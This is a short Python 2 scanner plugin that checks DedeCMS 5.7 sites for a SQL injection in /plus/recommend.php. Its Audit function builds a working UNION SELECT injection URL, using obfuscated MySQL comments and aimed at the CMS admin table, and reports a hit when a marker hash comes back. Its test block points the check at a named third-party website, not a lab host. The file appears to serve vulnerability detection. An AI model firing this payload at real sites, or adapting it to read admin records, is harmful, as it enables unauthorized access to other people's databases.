#!/usr/bin/python2.7
#coding:utf-8

import urllib2
from dummy import *

info = {
	'NAME':'DeDecms5.7 /plus/recommend.php SQL Injection',
	'AUTHOR':'seay,wjk',
	'TIME':'20150323',
	'WEB':'',
	'DESCRIPTION':'DedeCMS recommend.php文件通杀SQL注入漏洞，详见http://www.cnseay.com/3714/'
}
opts = {
	'url':'http://testasp.vulnweb.com',	#'target ip'
}
# opts = [
# 	['url','http://testasp.vulnweb.com','target url'],
# ]

def Assign(services):
	if services.has_key('url') and services.has_key('cms'):
		if services['cms'] == 'DedeCms':
			return True
	return False

def Audit(services):
	url = services['url'] +'/plus/recommend.php?aid=1&_FILES[type][name]&_FILES[type][size]&_FILES[type][type]&_FILES[type][tmp_name]=aa%5c%27and+char(@`%27`)+/*!50000Union*/+/*!50000SeLect*/+1,2,3,md5(0x40776562736166657363616E40),5,6,7,8,9%20from%20`%23@__admin`%23'
	try:
		ul = urllib2.urlopen(url)
		content = ul.read()
		if content.find('2e0e20673083dea5cc87a85d54022049') != -1:
			security_hole(url)
	except:
		pass
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	services = {'url':'http://www.eguan.cn'}
	pprint(Audit(services))
	pprint(services)
